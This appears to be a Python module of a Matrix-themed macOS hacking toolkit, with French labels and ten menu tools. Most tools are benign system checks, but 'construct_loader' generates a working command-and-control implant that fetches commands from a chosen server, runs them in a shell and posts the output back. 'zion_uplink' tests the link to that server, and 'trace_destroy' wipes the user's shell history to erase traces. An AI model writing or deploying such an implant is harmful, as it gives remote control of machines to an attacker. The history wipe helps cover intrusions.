# modules/neo.py - 10 tools de la source (Matrice)
import os, subprocess, hashlib, time, random

OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "sorties")
os.makedirs(OUT, exist_ok=True)

def ask(label): return input(f"  {label} : ").strip()
def r(cmd): subprocess.run(cmd, shell=True)

def source_vision():
    """les flux du systeme en direct : qui ecrit, qui parle, qui ecoute"""
    print("  Ctrl+C pour revenir\n")
    try:
        while True:
            os.system("clear")
            print("  SOURCE VISION - flux systeme\n" + "-" * 60)
            r("ps -arcwwwxo pid,pcpu,comm | head -8")
            r("lsof -nP -iTCP -sTCP:LISTEN | tail -6")
            time.sleep(2)
    except KeyboardInterrupt:
        print()

def residual_self_image():
    """ton image residuelle : la trace que tu laisses ICI et maintenant"""
    print("  --- image residuelle ---")
    r("who am i; w 2>/dev/null | head -5")
    print("  fichiers touches dans la derniere heure :")
    r("find ~ -maxdepth 2 -mmin -60 -type f 2>/dev/null | head -12")
    print("  presse-papiers actuel (taille) :")
    r('pbpaste | wc -c')

def construct_loader():
    """le constructeur : fabrique un payload python parametre (reverse shell C2)"""
    ip = ask("C2 ip") or "127.0.0.1"
    port = ask("port") or "8090"
    name = ask("nom du construct") or "construct"
    code = f'''#!/usr/bin/env python3
# construct {name} - check-in C2 (lab)
import subprocess, time, random, urllib.request, json
srv = "http://{ip}:{port}"
aid = "{name}-" + str(random.randint(100, 999))
while True:
    try:
        cmd = __import__("json").loads(urllib.request.urlopen(srv + "/?id=" + aid, timeout=8).read())["cmd"]
        if cmd and cmd != "noop":
            out = subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
            req = urllib.request.Request(srv, data=(out.stdout + out.stderr).encode(),
                                         headers={{"X-Agent": aid}}, method="POST")
            urllib.request.urlopen(req, timeout=8)
    except Exception:
        pass
    time.sleep(10 + random.uniform(0, 5))
'''
    p = os.path.join(OUT, name + ".py")
    open(p, "w").write(code)
    print(f"  [OK] construct genere : {p}")
    print(f"  lancement: python3 {p}  (C2 sur {ip}:{port})")

def agent_smith_hunt():
    """chasse : tout processus qui se duplique anormalement"""
    print("  analyse des duplications...\n")
    procs = subprocess.run("ps -axo comm", shell=True, capture_output=True).stdout.decode()
    counts = {}
    for p in procs.splitlines():
        counts[p.strip()] = counts.get(p.strip(), 0) + 1
    smiths = {k: v for k, v in counts.items() if v > 6 and "kernel" not in k}
    if smiths:
        print("  SMITH DETECTES (processus multiplies) :")
        for k, v in smiths.items():
            print(f"   {v}x  {k}")
    else:
        print("  aucun agent smith en vue - population stable.")

def zion_uplink():
    """test d'uplink vers Zion (ton C2)"""
    ip = ask("ip du C2") or "127.0.0.1"
    r(f"nc -z -G 2 {ip} 8090 && echo '  [OK] uplink Zion etabli (:8090)' || echo '  [X] pas d uplink - serveur off'")

def keymaker():
    """le fabricant de cles : paire RSA + empreinte"""
    key = os.path.join(OUT, "keymaker.pem")
    if not os.path.exists(key):
        r(f'openssl genrsa -out "{key}" 2048')
    pub = subprocess.run(f'openssl rsa -in "{key}" -pubout 2>/dev/null', shell=True,
                         capture_output=True).stdout.decode()
    print(pub[:400])
    print(f"  [OK] cle : {key}")

def trace_destroy():
    """efface TES traces de lab de CETTE session (historique terminal)"""
    print("  effacement de l'historique zsh de cette machine :")
    c = ask("confirmer (o/N)").lower()
    if c == "o":
        r("echo > ~/.zsh_history 2>/dev/null; rm -f ~/.zsh_history 2>/dev/null")
        print("  [OK] le passe est efface - sans destin")
    else:
        print("  sagesse.")

def white_rabbit():
    """suis le lapin blanc : demelage de redirections URL"""
    u = ask("URL")
    r(f'curl -sIL "{u}" | grep -iE "^(HTTP|location)" | head -12')

def oracle():
    """l'oracle ne dit pas l'avenir : elle dit ce que tu dois entendre"""
    print("\n  Tu sais déjà ce que tu dois savoir.\n")
    h = hashlib.sha256(str(time.time()).encode()).hexdigest()
    print(f"  (empreinte de l'instant : {h[:24]})")
    r('say "Tu es deja plus pres que tu ne le crois."')

def defensive_program():
    """la pilule bleue : rapport defensif complet"""
    print("  --- rapports de defense ---")
    r("pmset -g batt | head -3")
    r("softwareupdate -l 2>/dev/null | head -4 || echo '  (verif mises a jour: on)'")
    r("fdesetup status | head -2")
    r("ls ~/Library/LaunchAgents/ | head -10")

TOOLS = [
    ("SOURCE VISION",        "flux du systeme en direct",                 source_vision),
    ("IMAGE RESIDUELLE",     "la trace que tu laisses maintenant",        residual_self_image),
    ("CONSTRUCT LOADER",     "fabrique un payload C2 parametre",          construct_loader),
    ("AGENT SMITH HUNT",     "chasse aux processus dupliques",            agent_smith_hunt),
    ("ZION UPLINK",          "test de liaison avec le C2",                zion_uplink),
    ("THE KEYMAKER",         "paire de cles RSA",                         keymaker),
    ("TRACE DESTROY",        "efface l'historique terminal",              trace_destroy),
    ("WHITE RABBIT",         "demelage de redirections",                  white_rabbit),
    ("THE ORACLE",           "ce que tu dois entendre",                   oracle),
    ("DEFENSIVE PROGRAM",    "la pilule bleue : rapport defense",         defensive_program),
]
